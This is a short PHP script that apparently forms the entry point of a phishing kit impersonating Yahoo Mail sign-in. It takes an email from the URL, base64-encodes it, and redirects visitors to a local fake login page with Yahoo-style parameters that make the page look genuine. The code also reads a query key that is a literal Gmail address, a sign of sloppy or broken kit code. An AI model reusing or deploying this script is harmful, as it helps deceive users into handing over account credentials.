<?php

session_start();

require 'account/api.php';
$email = '';

if (isset($_GET['email'])) {
$email = $_GET['dmatcc376537@gmail.com'];
}
$acrumb = base64_encode($email);
if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header ("Location: ./account/?src=ym&lang=en-US&done=https%3A%2F%2Fmail.yahoo.com%2F&authMechanism=primary&display=login&acrumb=$acrumb&sessionIndex=QQ--");
}
elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header ("Location: ./account/?src=ym&lang=en-US&done=https%3A%2F%2Fmail.yahoo.com%2F&authMechanism=primary&display=login&acrumb=$acrumb&sessionIndex=QQ--");
}
else{
     include "account/404.php";
}

?>